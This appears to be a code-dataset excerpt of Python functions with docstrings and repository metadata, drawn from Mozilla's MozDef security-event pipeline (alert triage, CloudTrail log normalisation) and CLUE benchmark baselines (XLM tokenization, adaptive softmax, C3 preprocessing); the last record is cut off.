{"docstring": "\"\"\"Update the status of an alert.\n\nRequests are expected to take the following (JSON) form:\n\n```\n{\n    \"alert\": str,\n    \"status\": str,\n    \"user\": {\n        \"email\": str,\n        \"slack\": str\n    },\n    \"identityConfidence\": str\n    \"response\": str\n}\n```\n\nWhere:\n    * `\"alert\"` is the unique identifier fo the alert whose status\n    we are to update.\n    * `\"status\"` is one of \"manual\", \"inProgress\", \"acknowledged\"\n    or \"escalated\".\n    * `identityConfidence` is one of \"highest\", \"high\", \"moderate\", \"low\",\n    or \"lowest\".\n\n\nThis function writes back a response containing the following JSON.\n\n```\n{\n    \"error\": Optional[str]\n}\n```\n\nIf an error occurs and the alert is not able to be updated, then\nthe \"error\" field will contain a string message describing the issue.\nOtherwise, this field will simply be `null`.  This function will,\nalong with updating the alert's status, append information about the\nuser and their response to `alert['details']['triage']`.\n\nResponses will also use status codes to indicate success / failure / error.\n\"\"\"\n\n", "func_signal": "def update_alert_status():\n", "code": "initConfig()\n\nmongo = MongoClient(options.mongohost, options.mongoport)\nalerts = mongo.meteor[\"alerts\"]\n\ntry:\n    req = json.loads(request.body.read())\n    request.body.close()\nexcept ValueError:\n    response.status = StatusCode.BAD_REQUEST\n    return {\n        \"error\": \"Missing or invalid request body\"\n    }\n\nvalid_statuses = [\"manual\", \"inProgress\", \"acknowledged\", \"escalated\"]\n\nif req.get(\"status\") not in valid_statuses:\n    required = \" or \".join(valid_statuses)\n\n    response.status = StatusCode.BAD_REQUEST\n    return {\n        \"error\": \"Status not one of {}\".format(required),\n    }\n\nexpected_fields = [\"alert\", \"user\", \"response\", \"identityConfidence\"]\n\nif any([req.get(field) is None for field in expected_fields]):\n    required = \", \".join(expected_fields)\n\n    response.status = StatusCode.BAD_REQUEST\n    return {\n        \"error\": \"Missing a required field, one of {}\".format(required),\n    }\n\nvalid_confidences = [\"highest\", \"high\", \"moderate\", \"low\", \"lowest\"]\n\nif req.get(\"identityConfidence\") not in valid_confidences:\n    required = \" or \".join(valid_confidences)\n\n    response.status = StatusCode.BAD_REQUEST\n    return {\n        \"error\": \"identityConfidence not one of {}\".format(required),\n    }\n\ndetails = {\n    \"triage\": {\n        \"user\": req.get(\"user\"),\n        \"response\": req.get(\"response\"),\n    },\n    \"identityConfidence\": req.get(\"identityConfidence\"),\n}\n\nfields_to_update = {\n    \"status\": req.get(\"status\"),\n    \"details\": details,\n}\n\nif req.get(\"status\") == \"acknowledged\":\n    fields_to_update.update({\n        \"acknowledged\": toUTC(datetime.utcnow()),\n        \"acknowledgedby\": \"triagebot\",\n    })\n\nmodified_count = alerts.update_one(\n    {\"esmetadata.id\": req.get(\"alert\")}, {\"$set\": fields_to_update}\n).modified_count\n\nif modified_count != 1:\n    response.status = StatusCode.BAD_REQUEST\n    return {\"error\": \"Alert not found\"}\n\nresponse.status = StatusCode.OK\nreturn {\"error\": None}\n\nreturn response", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "''' return a json representation of the plugin tuple\n    (mname, mclass, mreg, mpriority)\n     minus the actual class (which isn't json-able)\n     for all plugins, or for a specific endpoint\n'''\n", "func_signal": "def getPluginList(endpoint=None):\n", "code": "pluginResponse = list()\nif endpoint is None:\n    for plugin in pluginList:\n        pdict = {}\n        pdict['file'] = plugin[0]\n        pdict['name'] = plugin[1]\n        pdict['description'] = plugin[2]\n        pdict['registration'] = plugin[3]\n        pdict['priority'] = plugin[4]\n        pluginResponse.append(pdict)\nelse:\n    # filter the list to just the endpoint requested\n    for plugin in pluginList:\n        if endpoint in plugin[3]:\n            pdict = {}\n            pdict['file'] = plugin[0]\n            pdict['name'] = plugin[1]\n            pdict['description'] = plugin[2]\n            pdict['registration'] = plugin[3]\n            pdict['priority'] = plugin[4]\n            pluginResponse.append(pdict)\nresponse.content_type = \"application/json\"\nresponse.body = json.dumps(pluginResponse)\n\nsendMessgeToPlugins(request, response, 'plugins')\nreturn response", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "'''\n   iterate the registered plugins\n   sending the response/request to any that have\n   registered for this rest endpoint\n'''\n# sort by priority\n", "func_signal": "def sendMessgeToPlugins(request, response, endpoint):\n", "code": "for plugin in sorted(pluginList, key=itemgetter(4), reverse=False):\n    if endpoint in plugin[3]:\n        (request, response) = plugin[5].onMessage(request, response)", "path": "MozDef/rest/index.py", "commit_date": "2020-07-13 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "# capture the hostname\n", "func_signal": "def initConfig():\n", "code": "options.mozdefhostname = getConfig(\"mozdefhostname\", socket.gethostname(), options.configfile)\n\n# output our log to stdout or syslog\noptions.output = getConfig(\"output\", \"stdout\", options.configfile)\noptions.sysloghostname = getConfig(\"sysloghostname\", \"localhost\", options.configfile)\noptions.syslogport = getConfig(\"syslogport\", 514, options.configfile)\n\n# elastic search options. set esbulksize to a non-zero value to enable bulk posting, set timeout to post no matter how many events after X seconds.\noptions.esservers = list(getConfig(\"esservers\", \"http://localhost:9200\", options.configfile).split(\",\"))\noptions.esbulksize = getConfig(\"esbulksize\", 0, options.configfile)\noptions.esbulktimeout = getConfig(\"esbulktimeout\", 30, options.configfile)\n\n# set to sqs for Amazon\noptions.mqprotocol = getConfig(\"mqprotocol\", \"sqs\", options.configfile)\n\n# rabbit message queue options\noptions.mqserver = getConfig(\"mqserver\", \"localhost\", options.configfile)\noptions.taskexchange = getConfig(\"taskexchange\", \"eventtask\", options.configfile)\n# rabbit: how many messages to ask for at once from the message queue\noptions.prefetch = getConfig(\"prefetch\", 10, options.configfile)\n# rabbit: user creds\noptions.mquser = getConfig(\"mquser\", \"guest\", options.configfile)\noptions.mqpassword = getConfig(\"mqpassword\", \"guest\", options.configfile)\n# rabbit: port/vhost\noptions.mqport = getConfig(\"mqport\", 5672, options.configfile)\noptions.mqvhost = getConfig(\"mqvhost\", \"/\", options.configfile)\n\n# aws options\noptions.accesskey = getConfig(\"accesskey\", \"\", options.configfile)\noptions.secretkey = getConfig(\"secretkey\", \"\", options.configfile)\noptions.region = getConfig(\"region\", \"\", options.configfile)\n\n# This is the full ARN that the s3 bucket lives under\noptions.cloudtrail_arn = getConfig(\"cloudtrail_arn\", \"cloudtrail_arn\", options.configfile)\n\n# How long to sleep between iterations of querying AWS\noptions.sleep_time = getConfig(\"sleep_time\", 0.1, options.configfile)", "path": "MozDef/mq/esworker_cloudtrail.py", "commit_date": "2020-02-12 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "\"\"\"map common key/fields to a normalized structure,\n   explicitly typed when possible to avoid schema changes for upsteam consumers\n   Special accomodations made for logstash,nxlog, beaver, heka and CEF\n   Some shippers attempt to conform to logstash-style @fieldname convention.\n   This strips the leading at symbol since it breaks some elastic search\n   libraries like elasticutils.\n\"\"\"\n", "func_signal": "def keyMapping(aDict):\n", "code": "returndict = dict()\n\nreturndict[\"source\"] = \"cloudtrail\"\nreturndict[\"details\"] = {}\nreturndict[\"category\"] = \"cloudtrail\"\nreturndict[\"processid\"] = str(os.getpid())\nreturndict[\"processname\"] = sys.argv[0]\nreturndict[\"tags\"] = [options.taskexchange]\nreturndict[\"severity\"] = \"INFO\"\nif \"sourceIPAddress\" in aDict and \"eventName\" in aDict and \"eventSource\" in aDict:\n    summary_str = \"{0} performed {1} in {2}\".format(\n        aDict[\"sourceIPAddress\"], aDict[\"eventName\"], aDict[\"eventSource\"]\n    )\n    returndict[\"summary\"] = summary_str\n\nif \"eventName\" in aDict:\n    # Uppercase first character\n    aDict[\"eventName\"] = aDict[\"eventName\"][0].upper() + aDict[\"eventName\"][1:]\n    returndict[\"details\"][\"eventVerb\"] = CLOUDTRAIL_VERB_REGEX.findall(aDict[\"eventName\"])[0]\n    returndict[\"details\"][\"eventReadOnly\"] = returndict[\"details\"][\"eventVerb\"] in [\"Describe\", \"Get\", \"List\"]\n# set the timestamp when we received it, i.e. now\nreturndict[\"receivedtimestamp\"] = toUTC(datetime.now()).isoformat()\nreturndict[\"mozdefhostname\"] = options.mozdefhostname\ntry:\n    for k, v in aDict.items():\n        k = removeAt(k).lower()\n\n        if k == \"sourceip\":\n            returndict[\"details\"][\"sourceipaddress\"] = v\n\n        elif k == \"sourceipaddress\":\n            returndict[\"details\"][\"sourceipaddress\"] = v\n\n        elif k in (\"facility\", \"source\"):\n            returndict[\"source\"] = v\n\n        elif k in (\"eventsource\"):\n            returndict[\"hostname\"] = v\n\n        elif k in (\"message\", \"summary\"):\n            returndict[\"summary\"] = toUnicode(v)\n\n        elif k in (\"payload\") and \"summary\" not in aDict:\n            # special case for heka if it sends payload as well as a summary, keep both but move payload to the details section.\n            returndict[\"summary\"] = toUnicode(v)\n        elif k in (\"payload\"):\n            returndict[\"details\"][\"payload\"] = toUnicode(v)\n\n        elif k in (\"eventtime\", \"timestamp\", \"utctimestamp\", \"date\"):\n            returndict[\"utctimestamp\"] = toUTC(v).isoformat()\n            returndict[\"timestamp\"] = toUTC(v).isoformat()\n\n        elif k in (\"hostname\", \"source_host\", \"host\"):\n            returndict[\"hostname\"] = toUnicode(v)\n\n        elif k in (\"tags\"):\n            if \"tags\" not in returndict:\n                returndict[\"tags\"] = []\n            if type(v) == list:\n                returndict[\"tags\"] += v\n            else:\n                if len(v) > 0:\n                    returndict[\"tags\"].append(v)\n\n        # nxlog keeps the severity name in syslogseverity,everyone else should use severity or level.\n        elif k in (\"syslogseverity\", \"severity\", \"severityvalue\", \"level\", \"priority\"):\n            returndict[\"severity\"] = toUnicode(v).upper()\n\n        elif k in (\"facility\", \"syslogfacility\"):\n            returndict[\"facility\"] = toUnicode(v)\n\n        elif k in (\"pid\", \"processid\"):\n            returndict[\"processid\"] = toUnicode(v)\n\n        # nxlog sets sourcename to the processname (i.e. sshd), everyone else should call it process name or pname\n        elif k in (\"pname\", \"processname\", \"sourcename\", \"program\"):\n            returndict[\"processname\"] = toUnicode(v)\n\n        # the file, or source\n        elif k in (\"path\", \"logger\", \"file\"):\n            returndict[\"eventsource\"] = toUnicode(v)\n\n        elif k in (\"type\", \"eventtype\", \"category\"):\n            returndict[\"category\"] = toUnicode(v)\n            returndict[\"type\"] = \"cloudtrail\"\n\n        # custom fields as a list/array\n        elif k in (\"fields\", \"details\"):\n            if type(v) is not dict:\n                returndict[\"details\"][\"message\"] = v\n            else:\n                if len(v) > 0:\n                    for details_key, details_value in v.items():\n                        returndict[\"details\"][details_key] = details_value\n\n        # custom fields/details as a one off, not in an array\n        # i.e. fields.something=value or details.something=value\n        # move them to a dict for consistency in querying\n        elif k.startswith(\"fields.\") or k.startswith(\"details.\"):\n            newName = k.replace(\"fields.\", \"\")\n            newName = newName.lower().replace(\"details.\", \"\")\n            # add a dict to hold the details if it doesn't exist\n            if \"details\" not in returndict:\n                returndict[\"details\"] = dict()\n            # add field with a special case for shippers that\n            # don't send details\n            # in an array as int/floats/strings\n            # we let them dictate the data type with field_datatype\n            # convention\n            if newName.endswith(\"_int\"):\n                returndict[\"details\"][str(newName)] = int(v)\n            elif newName.endswith(\"_float\"):\n                returndict[\"details\"][str(newName)] = float(v)\n            else:\n                returndict[\"details\"][str(newName)] = toUnicode(v)\n        else:\n            returndict[\"details\"][k] = v\n\n    if \"utctimestamp\" not in returndict:\n        # default in case we don't find a reasonable timestamp\n        returndict[\"utctimestamp\"] = toUTC(datetime.now()).isoformat()\n\nexcept Exception as e:\n    logger.exception(e)\n    logger.error(\"Malformed message: %r\" % aDict)\n\nreturn returndict", "path": "MozDef/mq/esworker_cloudtrail.py", "commit_date": "2020-02-12 00:00:00", "repo_name": "mozilla/MozDef", "stars": 2171, "license": "mpl-2.0", "language": "python", "size": 65127}
{"docstring": "\"\"\"\nCreates a mask from the two sequences passed to be used in a sequence-pair classification task.\nAn XLM sequence pair mask has the following format:\n0 0 0 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 1 1 1\n| first sequence    | second sequence\n\nif token_ids_1 is None, only returns the first portion of the mask (0's).\n\"\"\"\n", "func_signal": "def create_token_type_ids_from_sequences(self, token_ids_0, token_ids_1=None):\n", "code": "sep = [self.sep_token_id]\ncls = [self.cls_token_id]\nif token_ids_1 is None:\n    return len(cls + token_ids_0 + sep) * [0]\nreturn len(cls + token_ids_0 + sep) * [0] + len(token_ids_1 + sep) * [1]", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\" Converts a sequence of tokens (string) in a single string. \"\"\"\n", "func_signal": "def convert_tokens_to_string(self, tokens):\n", "code": "out_string = ''.join(tokens).replace('</w>', ' ').strip()\nreturn out_string", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "'''\n    Params:\n        hidden :: [len*bsz x d_proj]\n        labels :: [len*bsz]\n    Return:\n        if labels is None:\n            out :: [len*bsz] Negative log likelihood\n        else:\n            out :: [len*bsz x n_tokens] log probabilities of tokens over the vocabulary\n    We could replace this implementation by the native PyTorch one\n    if their's had an option to set bias on all clusters in the native one.\n    here: https://github.com/pytorch/pytorch/blob/dbe6a7a9ff1a364a8706bf5df58a1ca96d2fd9da/torch/nn/modules/adaptive.py#L138\n'''\n\n", "func_signal": "def forward(self, hidden, labels=None, keep_order=False):\n", "code": "if labels is not None:\n    labels = labels.view(-1)\n    if hidden.size(0) != labels.size(0):\n        raise RuntimeError('Input and labels should have the same size '\n                        'in the batch dimension.')\n\nif self.n_clusters == 0:\n    logit = self._compute_logit(hidden, self.out_layers[0].weight,\n                                self.out_layers[0].bias, self.out_projs[0])\n    if labels is not None:\n        out = -F.log_softmax(logit, dim=-1) \\\n                .gather(1, labels.unsqueeze(1)).squeeze(1)\n    else:\n        out = F.log_softmax(logit, dim=-1)\nelse:\n    # construct weights and biases\n    weights, biases = [], []\n    for i in range(len(self.cutoffs)):\n        if self.div_val == 1:\n            l_idx, r_idx = self.cutoff_ends[i], self.cutoff_ends[i + 1]\n            weight_i = self.out_layers[0].weight[l_idx:r_idx]\n            bias_i = self.out_layers[0].bias[l_idx:r_idx]\n        else:\n            weight_i = self.out_layers[i].weight\n            bias_i = self.out_layers[i].bias\n\n        if i == 0:\n            weight_i = torch.cat(\n                [weight_i, self.cluster_weight], dim=0)\n            bias_i = torch.cat(\n                [bias_i, self.cluster_bias], dim=0)\n\n        weights.append(weight_i)\n        biases.append(bias_i)\n\n    head_weight, head_bias, head_proj = weights[0], biases[0], self.out_projs[0]\n\n    head_logit = self._compute_logit(hidden, head_weight, head_bias, head_proj)\n    head_logprob = F.log_softmax(head_logit, dim=1)\n\n    if labels is None:\n        out = hidden.new_empty((head_logit.size(0), self.n_token))\n    else:\n        out = torch.zeros_like(labels, dtype=hidden.dtype, device=hidden.device)\n\n    offset = 0\n    cutoff_values = [0] + self.cutoffs\n    for i in range(len(cutoff_values) - 1):\n        l_idx, r_idx = cutoff_values[i], cutoff_values[i + 1]\n\n        if labels is not None:\n            mask_i = (labels >= l_idx) & (labels < r_idx)\n            indices_i = mask_i.nonzero().squeeze()\n\n            if indices_i.numel() == 0:\n                continue\n\n            target_i = labels.index_select(0, indices_i) - l_idx\n            head_logprob_i = head_logprob.index_select(0, indices_i)\n            hidden_i = hidden.index_select(0, indices_i)\n        else:\n            hidden_i = hidden\n\n        if i == 0:\n            if labels is not None:\n                logprob_i = head_logprob_i.gather(1, target_i[:, None]).squeeze(1)\n            else:\n                out[:, :self.cutoffs[0]] = head_logprob[:, :self.cutoffs[0]]\n        else:\n            weight_i, bias_i, proj_i = weights[i], biases[i], self.out_projs[i]\n\n            tail_logit_i = self._compute_logit(hidden_i, weight_i, bias_i, proj_i)\n            tail_logprob_i = F.log_softmax(tail_logit_i, dim=1)\n            cluster_prob_idx = self.cutoffs[0] + i - 1  # No probability for the head cluster\n            if labels is not None:\n                logprob_i = head_logprob_i[:, cluster_prob_idx] \\\n                        + tail_logprob_i.gather(1, target_i[:, None]).squeeze(1)\n            else:\n                logprob_i = head_logprob[:, cluster_prob_idx, None] + tail_logprob_i\n                out[:, l_idx:r_idx] = logprob_i\n\n        if labels is not None:\n            if (hasattr(self, 'keep_order') and self.keep_order) or keep_order:\n                out.index_copy_(0, indices_i, -logprob_i)\n            else:\n                out[offset:offset+logprob_i.size(0)].copy_(-logprob_i)\n            offset += logprob_i.size(0)\n\nreturn out", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/modeling_transfo_xl_utilities.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "'''\nPort of https://github.com/moses-smt/mosesdecoder/blob/master/scripts/tokenizer/replace-unicode-punctuation.perl\n'''\n", "func_signal": "def replace_unicode_punct(text):\n", "code": "text = text.replace('\uff0c', ',')\ntext = re.sub(r'\u3002\\s*', '. ', text)\ntext = text.replace('\u3001', ',')\ntext = text.replace('\u201d', '\"')\ntext = text.replace('\u201c', '\"')\ntext = text.replace('\u2236', ':')\ntext = text.replace('\uff1a', ':')\ntext = text.replace('\uff1f', '?')\ntext = text.replace('\u300a', '\"')\ntext = text.replace('\u300b', '\"')\ntext = text.replace('\uff09', ')')\ntext = text.replace('\uff01', '!')\ntext = text.replace('\uff08', '(')\ntext = text.replace('\uff1b', ';')\ntext = text.replace('\uff11', '\"')\ntext = text.replace('\u300d', '\"')\ntext = text.replace('\u300c', '\"')\ntext = text.replace('\uff10', '0')\ntext = text.replace('\uff13', '3')\ntext = text.replace('\uff12', '2')\ntext = text.replace('\uff15', '5')\ntext = text.replace('\uff16', '6')\ntext = text.replace('\uff19', '9')\ntext = text.replace('\uff17', '7')\ntext = text.replace('\uff18', '8')\ntext = text.replace('\uff14', '4')\ntext = re.sub(r'\uff0e\\s*', '. ', text)\ntext = text.replace('\uff5e', '~')\ntext = text.replace('\u2019', '\\'')\ntext = text.replace('\u2026', '...')\ntext = text.replace('\u2501', '-')\ntext = text.replace('\u3008', '<')\ntext = text.replace('\u3009', '>')\ntext = text.replace('\u3010', '[')\ntext = text.replace('\u3011', ']')\ntext = text.replace('\uff05', '%')\nreturn text", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"Constructs a InputExample.\nArgs:\n    guid: Unique id for the example.\n    text_a: string. The untokenized text of the first sequence. For single\n    sequence tasks, only this sequence must be specified.\n    text_b: (Optional) string. The untokenized text of the second sequence.\n    Only must be specified for sequence pair tasks.\n    label: (Optional) string. The label of the example. This should be\n    specified for train and dev examples, but not for test examples.\n\"\"\"\n", "func_signal": "def __init__(self, guid, text_a, text_b=None, label=None, text_c=None):\n", "code": "self.guid = guid\nself.text_a = text_a\nself.text_b = text_b\nself.text_c = text_c\nself.label = label", "path": "CLUE/baselines/models_pytorch/mrc_pytorch/run_c3.py", "commit_date": "2020-01-13 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"\nBuild model inputs from a sequence or a pair of sequence for sequence classification tasks\nby concatenating and adding special tokens.\nA RoBERTa sequence has the following format:\n    single sequence: <s> X </s>\n    pair of sequences: <s> A </s></s> B </s>\n\"\"\"\n", "func_signal": "def build_inputs_with_special_tokens(self, token_ids_0, token_ids_1=None):\n", "code": "if token_ids_1 is None:\n    return [self.cls_token_id] + token_ids_0 + [self.sep_token_id]\nsep = [self.sep_token_id]\ncls = [self.cls_token_id]\nreturn cls + token_ids_0 + sep + token_ids_1 + sep", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"\nRetrieves sequence ids from a token list that has no special tokens added. This method is called when adding\nspecial tokens using the tokenizer ``prepare_for_model`` or ``encode_plus`` methods.\n\nArgs:\n    token_ids_0: list of ids (must not contain special tokens)\n    token_ids_1: Optional list of ids (must not contain special tokens), necessary when fetching sequence ids\n        for sequence pairs\n    already_has_special_tokens: (default False) Set to True if the token list is already formated with\n        special tokens for the model\n\nReturns:\n    A list of integers in the range [0, 1]: 0 for a special token, 1 for a sequence token.\n\"\"\"\n\n", "func_signal": "def get_special_tokens_mask(self, token_ids_0, token_ids_1=None, already_has_special_tokens=False):\n", "code": "if already_has_special_tokens:\n    if token_ids_1 is not None:\n        raise ValueError(\"You should not supply a second sequence if the provided sequence of \"\n                         \"ids is already formated with special tokens for the model.\")\n    return list(map(lambda x: 1 if x in [self.sep_token_id, self.cls_token_id] else 0, token_ids_0))\n\nif token_ids_1 is not None:\n    return [1] + ([0] * len(token_ids_0)) + [1] + ([0] * len(token_ids_1)) + [1]\nreturn [1] + ([0] * len(token_ids_0)) + [1]", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "# Initialise PyTorch model\n", "func_signal": "def convert_tf_checkpoint_to_pytorch(tf_checkpoint_path, bert_config_file, pytorch_dump_path):\n", "code": "config = BertConfig.from_json_file(bert_config_file)\nprint(\"Building PyTorch model from configuration: {}\".format(str(config)))\nmodel = BertForPreTraining(config)\n\n# Load weights from tf checkpoint\nload_tf_weights_in_bert(model, config, tf_checkpoint_path)\n\n# Save pytorch-model\nprint(\"Save PyTorch model to {}\".format(pytorch_dump_path))\ntorch.save(model.state_dict(), pytorch_dump_path)", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/convert_bert_original_tf_checkpoint_to_pytorch.py", "commit_date": "2019-12-12 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"Save the tokenizer vocabulary and merge files to a directory.\"\"\"\n", "func_signal": "def save_vocabulary(self, save_directory):\n", "code": "if not os.path.isdir(save_directory):\n    logger.error(\"Vocabulary path ({}) should be a directory\".format(save_directory))\n    return\nvocab_file = os.path.join(save_directory, VOCAB_FILES_NAMES['vocab_file'])\nmerge_file = os.path.join(save_directory, VOCAB_FILES_NAMES['merges_file'])\n\nwith open(vocab_file, 'w', encoding='utf-8') as f:\n    f.write(json.dumps(self.encoder, ensure_ascii=False))\n\nindex = 0\nwith open(merge_file, \"w\", encoding=\"utf-8\") as writer:\n    for bpe_tokens, token_index in sorted(self.bpe_ranks.items(), key=lambda kv: kv[1]):\n        if index != token_index:\n            logger.warning(\"Saving vocabulary to {}: BPE merge indices are not consecutive.\"\n                           \" Please check that the tokenizer is not corrupted!\".format(merge_file))\n            index = token_index\n        writer.write(' '.join(bpe_tokens) + u'\\n')\n        index += 1\n\nreturn vocab_file, merge_file", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"Truncates a sequence tuple in place to the maximum length.\"\"\"\n\n# This is a simple heuristic which will always truncate the longer sequence\n# one token at a time. This makes more sense than truncating an equal percent\n# of tokens from each, since if one sequence is very short then each token\n# that's truncated likely contains more information than a longer sequence.\n", "func_signal": "def _truncate_seq_tuple(tokens_a, tokens_b, tokens_c, max_length):\n", "code": "while True:\n    total_length = len(tokens_a) + len(tokens_b) + len(tokens_c)\n    if total_length <= max_length:\n        break\n    if len(tokens_a) >= len(tokens_b) and len(tokens_a) >= len(tokens_c):\n        tokens_a.pop()\n    elif len(tokens_b) >= len(tokens_a) and len(tokens_b) >= len(tokens_c):\n        tokens_b.pop()\n    else:\n        tokens_c.pop()", "path": "CLUE/baselines/models_pytorch/mrc_pytorch/run_c3.py", "commit_date": "2020-01-13 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"\n    labels: [b1, b2]\nReturn\n    true_log_probs: [b1, b2]\n    samp_log_probs: [n_sample]\n    neg_samples: [n_sample]\n\"\"\"\n\n# neg_samples = torch.empty(0).long()\n", "func_signal": "def sample(self, labels):\n", "code": "n_sample = self.n_sample\nn_tries = 2 * n_sample\n\nwith torch.no_grad():\n    neg_samples = torch.multinomial(self.dist, n_tries, replacement=True).unique()\n    device = labels.device\n    neg_samples = neg_samples.to(device)\n    true_log_probs = self.log_q[labels].to(device)\n    samp_log_probs = self.log_q[neg_samples].to(device)\n    return true_log_probs, samp_log_probs, neg_samples", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/modeling_transfo_xl_utilities.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"Reads a tab separated value file.\"\"\"\n", "func_signal": "def _read_tsv(cls, input_file, quotechar=None):\n", "code": "with open(input_file, \"r\") as f:\n    reader = csv.reader(f, delimiter=\"\\t\", quotechar=quotechar)\n    lines = []\n    for line in reader:\n        lines.append(line)\n    return lines", "path": "CLUE/baselines/models_pytorch/mrc_pytorch/run_c3.py", "commit_date": "2020-01-13 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"Creates examples for the training and dev sets.\"\"\"\n", "func_signal": "def _create_examples(self, data, set_type):\n", "code": "cache_dir = os.path.join(self.data_dir, set_type + '_examples.pkl')\nif os.path.exists(cache_dir):\n    examples = pickle.load(open(cache_dir, 'rb'))\nelse:\n    examples = []\n    for (i, d) in enumerate(data):\n        answer = -1\n        # \u8fd9\u91ccdata[i]\u67096\u4e2a\u5143\u7d20\uff0c0\u662fcontext\uff0c1\u662f\u95ee\u9898\uff0c2~5\u662fchoice\uff0c6\u662f\u7b54\u6848\n        for k in range(4):\n            if data[i][2 + k] == data[i][6]:\n                answer = str(k)\n\n        label = tokenization.convert_to_unicode(answer)\n\n        for k in range(4):\n            guid = \"%s-%s-%s\" % (set_type, i, k)\n            text_a = tokenization.convert_to_unicode(data[i][0])\n            text_b = tokenization.convert_to_unicode(data[i][k + 2])\n            text_c = tokenization.convert_to_unicode(data[i][1])\n            examples.append(InputExample(guid=guid, text_a=text_a, text_b=text_b, label=label, text_c=text_c))\n\n    with open(cache_dir, 'wb') as w:\n        pickle.dump(examples, w)\n\nreturn examples", "path": "CLUE/baselines/models_pytorch/mrc_pytorch/run_c3.py", "commit_date": "2020-01-13 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"\nLowercase and strips accents from a piece of text based on\nhttps://github.com/facebookresearch/XLM/blob/master/tools/lowercase_and_remove_accent.py\n\"\"\"\n", "func_signal": "def lowercase_and_remove_accent(text):\n", "code": "text = ' '.join(text)\ntext = text.lower()\ntext = unicodedata.normalize(\"NFD\", text)\noutput = []\nfor char in text:\n    cat = unicodedata.category(char)\n    if cat == \"Mn\":\n        continue\n    output.append(char)\nreturn \"\".join(output).lower().split(' ')", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "\"\"\"\nReturn set of symbol pairs in a word.\nword is represented as tuple of symbols (symbols being variable-length strings)\n\"\"\"\n", "func_signal": "def get_pairs(word):\n", "code": "pairs = set()\nprev_char = word[0]\nfor char in word[1:]:\n    pairs.add((prev_char, char))\n    prev_char = char\nreturn pairs", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "CLUEbenchmark/CLUE", "stars": 3748, "license": "None", "language": "python", "size": 2779}
{"docstring": "'''Sennrich's WMT16 scripts for Romanian preprocessing, used by model `xlm-mlm-enro-1024`'''\n# https://github.com/rsennrich/wmt16-scripts/blob/master/preprocess/normalise-romanian.py\n", "func_signal": "def romanian_preprocessing(text):\n", "code": "text = text.replace(\"\\u015e\", \"\\u0218\").replace(\"\\u015f\", \"\\u0219\")\ntext = text.replace(\"\\u0162\", \"\\u021a\").replace(\"\\u0163\", \"\\u021b\")\n# https://github.com/rsennrich/wmt16-scripts/blob/master/preprocess/remove-diacritics.py\ntext = text.replace(\"\\u0218\", \"S\").replace(\"\\u0219\", \"s\") #s-comma\ntext = text.replace(\"\\u021a\", \"T\").replace(\"\\u021b\", \"t\") #t-comma\ntext = text.replace(\"\\u0102\", \"A\").replace(\"\\u0103\", \"a\")\ntext = text.replace(\"\\u00C2\", \"A\").replace(\"\\u00E2\", \"a\")\ntext = text.replace(\"\\u00CE\", \"I\").replace(\"\\u00EE\", \"i\")\nreturn text", "path": "CLUE/baselines/models_pytorch/classifier_pytorch/transformers/tokenization_xlm.py", "commit_date": "2019-11-22 00:00:00", "repo_name": 